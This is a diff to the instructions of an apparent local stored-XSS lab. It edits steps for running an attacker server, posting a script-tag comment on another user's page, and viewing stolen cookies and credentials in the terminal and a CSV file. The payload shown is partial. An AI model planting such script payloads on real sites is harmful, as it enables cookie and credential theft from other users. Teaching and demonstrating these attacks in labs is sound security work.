@@ -9,7 +9,7 @@ python attacker_server.py
 ```
 2) Open http://127.0.0.1 or http://localhost
 3) Register 2 new users (e.g. Alice and Bob)
-4) Login as Alice, leave a comment (script below):
+4) Login as Alice, leave a comment on the Bob's page (script below):
 ```html
 <script>
 	alert("your cookies has been stolen");
@@ -17,4 +17,5 @@ python attacker_server.py
 </script>
 ```
 5) Logout form Alice and login as Bob.
-6) See the result in Terminal.
+6) See the result in Terminal and stolen_credential.csv.
+Note: You'll also see your own login and password in .csv-file.
